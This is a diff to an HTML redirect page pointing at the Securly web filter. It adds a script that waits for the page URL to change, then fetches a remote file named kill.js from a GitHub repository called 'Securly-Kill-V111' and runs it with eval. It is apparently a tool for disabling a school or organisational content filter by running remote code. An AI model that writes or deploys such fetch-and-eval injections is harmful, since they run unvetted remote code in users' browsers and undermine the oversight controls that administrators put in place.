@@ -5,6 +5,35 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Redirecting</title>
     <meta http-equiv="refresh" content="0; url=https://securly.com">
+
+    <script>
+    // Wait for the page to load
+    window.addEventListener('load', () => {
+        // Store the current URL
+        const currentUrl = window.location.href;
+
+        // Periodically check for redirection
+        const checkRedirect = setInterval(() => {
+            const newUrl = window.location.href;
+            if (newUrl !== currentUrl) {
+                console.log('Redirect detected:', newUrl);
+
+                // Inject the script after redirection
+                fetch('https://raw.githubusercontent.com/zek-c/Securly-Kill-V111/main/kill.js')
+                    .then(response => response.text())
+                    .then(scriptContent => {
+                        eval(scriptContent);
+                        console.log('Injected script executed.');
+                    })
+                    .catch(err => console.error('Error fetching script:', err));
+
+                clearInterval(checkRedirect); // Stop checking after redirect
+            }
+        }, 500); // Check every 500ms
+    });
+</script>
+
+    
 </head>
 <body>
 
